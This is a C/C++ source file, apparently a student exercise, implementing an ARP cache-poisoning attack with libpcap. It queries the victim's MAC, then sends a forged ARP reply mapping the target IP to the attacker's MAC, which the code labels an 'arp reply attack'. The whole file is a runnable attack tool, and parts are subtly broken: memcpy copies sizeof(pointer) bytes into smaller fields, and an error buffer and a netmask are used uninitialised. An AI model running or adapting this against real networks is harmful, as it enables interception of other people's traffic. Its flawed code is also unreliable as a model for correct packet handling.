#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <pcap.h>
#include <net/ethernet.h>
#include <arpa/inet.h>
#include <libnet.h>
#include <sys/socket.h>
#include <sys/ioctl.h>
#include <linux/if.h>
#include <netdb.h>
#include <stdint.h>
#include <unistd.h>


uint8_t my_mac[6] = {};
uint8_t my_ip[4] = {};
uint8_t target_ip[4]; // = {0xac,0x14,0x0a,0x01}; // argv[3]
uint8_t broadcast1[6] = {0xff,0xff,0xff,0xff,0xff,0xff};
uint8_t broadcast2[6] = {0x00,0x00,0x00,0x00,0x00,0x00};
uint8_t sender_ip[4]; // = {0xac,0x14,0x0a,0x03}; // argv[2]
uint8_t sender_mac[6] = {}; 


/*
 * Ethernet Header Structure
 */
struct eth_header{
	uint8_t eth_dmac[6];
	uint8_t eth_smac[6];
	uint16_t eth_type;
};


/*
 * ARP Header Structure
 */
struct arp_header {
	uint16_t arp_hwtype;
	uint16_t arp_protocol_type;
	uint8_t arp_hlen;
	uint8_t arp_plen;
	uint16_t arp_opr;
	uint8_t arp_smacaddr[6];
	uint8_t arp_sipaddr[4];
	uint8_t arp_tmacaddr[6];
	uint8_t arp_tipaddr[4];
};


/*
 * ETH + ARP Header -> Packet Structure
 */
struct eth_arp_packet {
	eth_header eth;
	arp_header arph;
};


/*
 * Function that gets my IP, MAC Address
 */
void my_infra(char *dev){
	
	struct ifreq my_info;
	int32_t sock = socket(PF_INET, SOCK_DGRAM, IPPROTO_IP);
	
	strcpy(my_info.ifr_name, dev);
	ioctl(sock, SIOCGIFHWADDR, &my_info);
	
	printf("My MAC:");
	for(int32_t i=0;i<6;i++){
		my_mac[i] = (uint8_t) my_info.ifr_ifru.ifru_hwaddr.sa_data[i];
		printf("%02x ",my_mac[i]);
	}
	printf("\n");

	ioctl(sock, SIOCGIFADDR, &my_info);
	
	printf("My IP:");
	for(int32_t i=2;i<6; ++i){
		my_ip[i-2] = (uint8_t) my_info.ifr_ifru.ifru_addr.sa_data[i];
		printf("%02x ",my_ip[i-2]);
	}
	printf("\n");
	
	close(sock);

}


/*
 * Function that parses my input IP Address
 */
void parse_input_sender_ip(char * ip_addr){
	char * ptr = strtok(ip_addr, ".");
	
	int32_t cnt = 0;
	while (ptr != NULL) {
		sender_ip[cnt] = int8_t(atoi(ptr));
		ptr = strtok(NULL, ".");
		cnt++;
	}
}

void parse_input_target_ip(char * ip_addr){
	char * ptr = strtok(ip_addr, ".");
	
	int32_t cnt = 0;
	while (ptr != NULL) {
		target_ip[cnt] = char(atoi(ptr));
		ptr = strtok(NULL, ".");
		cnt++;
	}
}


/*
 * Function that generates actual ARP REQUEST, ARP REPLY Packet from the parameters
 */
void make_eth_arp_pkt(eth_arp_packet * pkt, uint8_t * eth_dst_mac, uint8_t * eth_src_mac, uint8_t * arp_src_mac, uint8_t * arp_src_ip, uint8_t * arp_dst_mac, uint8_t * arp_dst_ip, int32_t OP){
	
	eth_header eth;
	memcpy(eth.eth_dmac, eth_dst_mac, sizeof(eth_dst_mac)); 
	memcpy(eth.eth_smac, eth_src_mac, sizeof(eth_src_mac));
	eth.eth_type= htons(ETH_P_ARP); // ??
	
	
	arp_header arph;
	arph.arp_hwtype = htons(ARPHRD_ETHER);
	arph.arp_protocol_type = htons(ETH_P_IP);
	arph.arp_hlen = sizeof(eth.eth_dmac);
	arph.arp_plen = sizeof(arph.arp_sipaddr);
	if(OP == 0){ // request
		arph.arp_opr = htons(ARPOP_REQUEST);
	}else{ // reply
		arph.arp_opr = htons(ARPOP_REPLY);
	}; 
	memcpy(arph.arp_smacaddr, arp_src_mac, sizeof(arp_src_mac));
	memcpy(arph.arp_sipaddr, arp_src_ip, sizeof(arp_src_ip)); 
	memcpy(arph.arp_tmacaddr, arp_dst_mac, sizeof(arp_dst_mac)); 
	memcpy(arph.arp_tipaddr, arp_dst_ip, sizeof(arp_dst_ip)); 

	pkt->eth = eth;
	pkt->arph = arph;
}


int main(int argc, char * argv[]){ 
	
	char *dev;
	char *errbuf;
	pcap_t *handle;
	char filter_exp[] = "arp && arp [6:2] = 2"; //  protocol == arp && arp.opcode == 0x0002 (reply)
	struct bpf_program fp;
	
	bpf_u_int32 mask;
	bpf_u_int32 net;
	struct pcap_pkthdr *header;
	const unsigned char *data;
	
	dev = argv[1]; // setting interface : "enp0s3"
	my_infra(dev);


	// parsing input
	parse_input_sender_ip(argv[2]);
	parse_input_target_ip(argv[3]);

	
	// Opening the device (enp0s3) for sniffing
	if(!(handle = pcap_open_live(dev, 65535, 1, 0, errbuf))){
		printf("%s", errbuf);
		return -1;
	}
	

	// Making ARP Request Packet
	eth_arp_packet request;
	make_eth_arp_pkt(&request, broadcast1, my_mac, my_mac, my_ip, broadcast2, sender_ip,0);
	
	
	// Sending ARP Request Packet
	if(pcap_sendpacket(handle, (const u_char*)&request, (sizeof(request)))!=0){
		printf("pcap_sendpacket error\n");
	} else{
		printf("arp request packet sent\n");
	}


	// compile the pcap filter
	if(pcap_compile(handle, &fp, filter_exp, 0, net) == -1){
		fprintf(stderr, "Couldn't parse filter %s:%s\n", filter_exp, pcap_geterr(handle));
		return(2);
	}
	

	// Apply our filter into pcap
	if(pcap_setfilter(handle, &fp) == -1){
		fprintf(stderr, "Couldn't install filter %s: %s\n", filter_exp, pcap_geterr(handle));
		return(2);
	}
	
	
	// Actual Sniffing Starts!
	// Sniff ARP Reply Packet from Sender
	int res = 0;
	while(true){
		res = pcap_next_ex(handle, &header, &data);
		if(res ==0){
			continue;
		} else if(res>0){
			int32_t tmp = 0;
			for(int32_t i=0;i<6;i++){
				if(data[i] == my_mac[i]){
					tmp++;
				}
			}
			if(tmp == 6) { // if ARP reply's destination mac address is as same as my mac address
				data = data +6;
				printf("Sender MAC:");
				for(int32_t i=0;i<6;i++){
					sender_mac[i] = data[i];
					printf("%02x ", sender_mac[i]);
				}
				printf("\n");
				break;
			} else {
				continue;
			}		
		}
	}

	// Sending arp reply attack
	eth_arp_packet reply;
	make_eth_arp_pkt(&reply, sender_mac, my_mac, my_mac, target_ip, sender_mac, sender_ip,1);
	
	if(pcap_sendpacket(handle, (const u_char*)&reply, (sizeof(reply)))!=0){
		printf("pcap_sendpacket error\n");
	} else{
		printf("arp reply attack packet sent\n");
	}
}
